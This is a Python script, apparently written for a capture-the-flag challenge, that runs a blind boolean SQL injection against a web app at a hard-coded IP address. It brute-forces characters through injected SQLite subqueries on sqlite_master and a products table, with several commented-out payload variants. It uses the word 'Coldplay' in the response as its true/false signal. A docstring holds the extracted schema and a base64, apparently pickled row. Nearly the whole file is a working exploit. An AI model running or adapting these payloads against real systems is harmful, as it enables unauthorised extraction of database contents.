import os
import re
from string import printable

import requests

BASE_URL = "http://34.124.192.13:54679/view/"

charset = " " + printable
charset = charset[: charset.find("/")] + charset[charset.find("/") + 1 :]

table_name = ""
index = 1

"""
Schema
CREATE TABLE products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    data TEXT NOT NULL,
    created_at NOT NULL DEFAULT CURRENT_TIMESTAMP
)

Data 1:
gASVpAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwHcHJvZHVjdJSMC0Jhc2ljIFNoaXJ0lIwEZGVzY5SMI0dldCBvdXIgbmV3IEJhc2ljIFdvcmxkIFRvdXIgOSBUZWUhlIwFaW1hZ2WUjB4vc3RhdGljL2ltYWdlcy9iYXNpY19zaGlydC5wbmeUjAVwcmljZZSMAjQwlHViLg==
"""


while True:
    for idx, char in enumerate(charset):
        # PAYLOAD = f"1' and (SELECT hex(substr(sql,{index},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') = hex('{char}') --"
        # PAYLOAD = f"3' and (SELECT hex(substr(tbl_name,{index},1)) FROM sqlite_master WHERE type !='meta' AND sql NOT NULL AND name = 'products') = hex('{char}') --"
        # PAYLOAD = f"3' AND (SELECT hex(substr(sql,{index},1)) FROM sqlite_master WHERE sql NOT NULL AND tbl_name = 'products') = hex('{char}') --"
        PAYLOAD = f"1' AND (SELECT hex(substr(data,{index},1)) FROM products LIMIT 1 OFFSET 0) = hex('{char}') --"
        # PAYLOAD = f"3' AND (SELECT hex(substr(products,{index},1)) FROM products LIMIT 1 OFFSET 0) = hex('{char}') --"
        # PAYLOAD = f"1' AND substr((SELECT sql FROM sqlite_master WHERE type ='table' and tbl_name NOT like 'sqlite_%'), {index}, 1) = '{char}' --"
        URL = BASE_URL + PAYLOAD
        r = requests.get(URL)

        if "Coldplay" in r.text:
            table_name += char
            index += 1
            print(table_name)
            break

        if idx >= len((charset)) - 1:
            print(os._exit(-1))
            exit(-1)
